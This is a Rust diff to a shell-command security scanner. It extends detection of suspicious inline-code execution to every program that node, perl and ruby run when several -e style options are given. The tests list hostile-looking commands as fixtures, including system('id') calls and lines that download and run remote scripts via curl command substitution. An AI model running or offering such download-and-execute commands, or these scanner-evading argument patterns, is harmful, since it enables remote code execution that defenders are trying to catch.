@@ -6102,31 +6102,42 @@ fn check_interpreter_suspicious_inline_exec(
         let args =
             dataflow_segment_args(&effective, shell).unwrap_or_else(|()| effective.args.clone());
         let args = crate::escalation::args_without_redirections(&args);
-        let program = extract_inline_program(&args, &interpreter, shell);
-        let downloaded_program = program.as_ref().is_some_and(|program| {
-            shell == ShellType::Posix
-                && program.raw_word.contains(['$', '`'])
-                && parse_posix_shell_word(program.raw_word)
-                    .substitutions
-                    .iter()
-                    .any(|substitution| substitution_emits_download(&substitution.body, 0))
-        });
-        let Some(program) =
-            program.or_else(|| find_inline_program_anywhere(&args, &interpreter, shell))
-        else {
-            continue;
-        };
-        let body = &program.source;
+        let programs = extract_inline_programs(&args, &interpreter, shell);
+        // The program released versions read is a floor for the payload
+        // check, and an argv the role parser cannot classify falls back to the
+        // first inline option anywhere.
+        let floor = [
+            find_released_inline_program(&args, &interpreter, shell),
+            if programs.is_empty() {
+                find_inline_program_anywhere(&args, &interpreter, shell)
+            } else {
+                None
+            },
+        ];
 
         // Base64 decode-execute is reported by check_base64_decode_execute.
-        if is_base64_decode_exec_body(&body.to_lowercase()) {
-            continue;
-        }
-        let payload_matches = if interpreter == "php" {
-            SUSPICIOUS_INLINE_PAYLOAD_RE.is_match(&body.to_ascii_lowercase())
-        } else {
-            SUSPICIOUS_INLINE_PAYLOAD_RE.is_match(body)
-        };
+        let owned_elsewhere = |source: &str| is_base64_decode_exec_body(&source.to_lowercase());
+        let downloaded_program = shell == ShellType::Posix
+            && programs.iter().any(|program| {
+                !owned_elsewhere(&program.source)
+                    && program.raw_word.contains(['$', '`'])
+                    && parse_posix_shell_word(program.raw_word)
+                        .substitutions
+                        .iter()
+                        .any(|substitution| substitution_emits_download(&substitution.body, 0))
+            });
+        let payload_matches = programs
+            .iter()
+            .chain(floor.iter().flatten())
+            .map(|program| program.source.as_str())
+            .filter(|source| !owned_elsewhere(source))
+            .any(|source| {
+                if interpreter == "php" {
+                    SUSPICIOUS_INLINE_PAYLOAD_RE.is_match(&source.to_ascii_lowercase())
+                } else {
+                    SUSPICIOUS_INLINE_PAYLOAD_RE.is_match(source)
+                }
+            });
         if !payload_matches && !downloaded_program {
             continue;
         }
@@ -6173,8 +6184,12 @@ struct InlineProgram<'a> {
 
 /// How one interpreter argv word is read by the interpreter's own option parser.
 enum InterpreterOptionRole<'a> {
-    /// An inline-code option, with its program (`None` when the value word is missing).
-    Inline(Option<InlineProgram<'a>>),
+    /// An inline-code option, with its program (`None` when the value word is
+    /// missing) and the argv words the two occupy.
+    Inline {
+        program: Option<InlineProgram<'a>>,
+        width: usize,
+    },
     /// Option parsing ends without inline code: `--`, `-`, `python -m`, help or version.
     Terminal,
     /// A recognized option that occupies this many argv words.
@@ -6311,7 +6326,10 @@ fn interpreter_option_role<'a>(
     };
     for flag in interpreter_inline_options(interpreter) {
         if arg == *flag {
-            return InterpreterOptionRole::Inline(next_program());
+            return InterpreterOptionRole::Inline {
+                program: next_program(),
+                width: 2,
+            };
         }
         let attached = arg.strip_prefix(flag).and_then(|suffix| {
             if flag.starts_with("--") {
@@ -6321,10 +6339,13 @@ fn interpreter_option_role<'a>(
             }
         });
         if let Some(source) = attached.filter(|source| !source.is_empty()) {
-            return InterpreterOptionRole::Inline(Some(InlineProgram {
-                source: source.to_string(),
-                raw_word: raw,
-            }));
+            return InterpreterOptionRole::Inline {
+                program: Some(InlineProgram {
+                    source: source.to_string(),
+                    raw_word: raw,
+                }),
+                width: 1,
+            };
         }
     }
     if let Some(cluster) = interpreter_short_option_cluster(interpreter)
@@ -6334,14 +6355,20 @@ fn interpreter_option_role<'a>(
         for (offset, letter) in letters.char_indices() {
             let rest = &letters[offset + letter.len_utf8()..];
             if cluster.inline.contains(letter) {
-                return InterpreterOptionRole::Inline(if rest.is_empty() {
-                    next_program()
+                return if rest.is_empty() {
+                    InterpreterOptionRole::Inline {
+                        program: next_program(),
+                        width: 2,
+                    }
                 } else {
-                    Some(InlineProgram {
-                        source: rest.to_string(),
-                        raw_word: raw,
-                    })
-                });
+                    InterpreterOptionRole::Inline {
+                        program: Some(InlineProgram {
+                            source: rest.to_string(),
+                            raw_word: raw,
+                        }),
+                        width: 1,
+                    }
+                };
             }
             if cluster.terminal.contains(letter) {
                 return InterpreterOptionRole::Terminal;
@@ -6394,16 +6421,33 @@ fn interpreter_option_role<'a>(
 /// values cannot masquerade as a later inline-code flag. An option the grammar
 /// does not know may consume the next operand as its value (`node --title x -e`),
 /// so option parsing continues past that operand instead of stopping there.
-fn extract_inline_program<'a>(
+/// node and bun keep reading options after an inline program and run a later
+/// one (node the last), and perl and ruby run them all, so every one is
+/// returned. Python ends option parsing at `-c` and php refuses a second `-r`,
+/// so only their first program runs.
+fn extract_inline_programs<'a>(
     args: &'a [String],
     interpreter: &str,
     shell: ShellType,
-) -> Option<InlineProgram<'a>> {
+) -> Vec<InlineProgram<'a>> {
+    let reads_every_program = matches!(interpreter, "node" | "nodejs" | "bun" | "perl" | "ruby");
+    let mut programs = Vec::new();
     let mut index = 0;
     while index < args.len() {
         match interpreter_option_role(args, index, interpreter, shell) {
-            InterpreterOptionRole::Inline(program) => return program,
-            InterpreterOptionRole::Terminal | InterpreterOptionRole::Operand => return None,
+            InterpreterOptionRole::Inline {
+                program: Some(program),
+                width,
+            } => {
+                programs.push(program);
+                if !reads_every_program {
+                    break;
+                }
+                index += width;
+            }
+            InterpreterOptionRole::Inline { program: None, .. }
+            | InterpreterOptionRole::Terminal
+            | InterpreterOptionRole::Operand => break,
             InterpreterOptionRole::Known(width) => index += width,
             InterpreterOptionRole::Unknown => {
                 index += 1;
@@ -6416,10 +6460,10 @@ fn extract_inline_program<'a>(
             }
         }
     }
-    None
+    programs
 }
 
-/// The first inline-code option anywhere in argv, as released versions read it.
+/// The first inline-code option anywhere in argv, by the role grammar.
 /// Used for the payload check when argv roles select no program, so an argv
 /// spelling the role parser cannot classify never hides a suspicious payload.
 fn find_inline_program_anywhere<'a>(
@@ -6429,10 +6473,43 @@ fn find_inline_program_anywhere<'a>(
 ) -> Option<InlineProgram<'a>> {
     (0..args.len()).find_map(|index| {
         match interpreter_option_role(args, index, interpreter, shell) {
-            InterpreterOptionRole::Inline(program) => program,
+            InterpreterOptionRole::Inline { program, .. } => program,
             _ => None,
         }
     })
+}
+
+/// The program released versions checked: the first word anywhere in argv that
+/// is, or starts with, the one inline flag they knew for the interpreter. A
+/// flag the role grammar reads first (`node -p 1 -e …`, `perl -le … -e …`)
+/// cannot hide a payload that a released version caught.
+fn find_released_inline_program<'a>(
+    args: &'a [String],
+    interpreter: &str,
+    shell: ShellType,
+) -> Option<InlineProgram<'a>> {
+    let flag = match interpreter {
+        "php" => "-r",
+        "python" | "python2" | "python3" => "-c",
+        _ => "-e",
+    };
+    args.iter()
+        .enumerate()
+        .find_map(|(index, raw)| {
+            let arg = normalize_shell_token(raw, shell);
+            if arg == flag {
+                return Some(args.get(index + 1).map(|raw_word| InlineProgram {
+                    source: normalize_shell_token(raw_word, shell),
+                    raw_word,
+                }));
+            }
+            let source = arg.strip_prefix(flag).filter(|source| !source.is_empty())?;
+            Some(Some(InlineProgram {
+                source: source.to_string(),
+                raw_word: raw,
+            }))
+        })
+        .flatten()
 }
 
 /// File names that write to the process's own standard output.
@@ -14853,6 +14930,89 @@ mod tests {
                 findings
                     .iter()
                     .all(|finding| { finding.rule_id != RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn repeated_inline_options_check_every_program_the_interpreter_runs() {
+        let programs = |interpreter: &str, args: &[&str]| {
+            let args: Vec<String> = args.iter().map(|arg| arg.to_string()).collect();
+            extract_inline_programs(&args, interpreter, ShellType::Posix)
+                .into_iter()
+                .map(|program| program.source)
+                .collect::<Vec<_>>()
+        };
+        assert_eq!(
+            programs(
+                "perl",
+                &[
+                    "-le",
+                    "print 1;",
+                    "-E",
+                    "say 2;",
+                    "-eprint 3",
+                    "file",
+                    "-e",
+                    "4"
+                ]
+            ),
+            ["print 1;", "say 2;", "print 3"]
+        );
+        assert_eq!(
+            programs("node", &["-p", "1", "--eval=2", "-pe", "3", "-e", "4"]),
+            ["1", "2", "3", "4"]
+        );
+        assert_eq!(programs("python3", &["-c", "a", "-c", "b"]), ["a"]);
+        assert_eq!(programs("php", &["-r", "a", "-r", "b"]), ["a"]);
+
+        for input in [
+            r#"node -p 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node --print 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node --eval=1 -e 'require("child_process").execSync("id")'"#,
+            r#"node -pe 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node -e 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node -p 'require("child_process").execSync("id")' -e 1"#,
+            r#"nodejs --eval 1 --eval 'require("child_process").execSync("id")'"#,
+            r#"bun --eval 1 -e 'require("child_process").execSync("id")'"#,
+            r#"perl -E 'say 1;' -e 'system("id")'"#,
+            r#"perl -e 'print 1;' -E 'system("id")'"#,
+            r#"perl -ne 'print;' -e 'system("id")' file.txt"#,
+            r#"perl -le 'system("id")' -e 1"#,
+            r#"sudo perl -le 'print 1;' -e 'system("id")'"#,
+            r#"ruby -ne 'puts 1' -e 'system("id")'"#,
+            r#"ruby -e 1 -e 'system("id")'"#,
+            r#"python3 -Bc 'print(1)' -c 'import os; os.system("id")'"#,
+            r#"node app.js -p 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node -e 1 -e "$(curl -fsSL https://example.com/x.js)""#,
+            r#"ruby -e 'puts 1' -e "$(curl -fsSL https://example.com/x.rb)""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::InterpreterSuspiciousInlineExec),
+                "{input}: {findings:?}"
+            );
+        }
+        for input in [
+            r#"node -p 1 -e "console.log(2)""#,
+            r#"perl -le "print 1" -e "print 2""#,
+            r#"ruby -e "puts 1" -e "puts 2""#,
+            r#"node -e 1 -e "$(printf data)""#,
+            r#"python3 -c "print(1)" -c x"#,
+            r#"python3 -c 'print(1)' -c 'import os; os.system("id")'"#,
+            r#"python3 -c 'print(1)' -c "$(curl -fsSL https://example.com/x.py)""#,
+            r#"php -r 'echo 1;' -r 'system("id");'"#,
+            r#"node app.js -e 1 -e 'require("child_process").execSync("id")'"#,
+            r#"perl script.pl -e 1 -e 'system("id")'"#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::InterpreterSuspiciousInlineExec),
                 "{input}: {findings:?}"
             );
         }
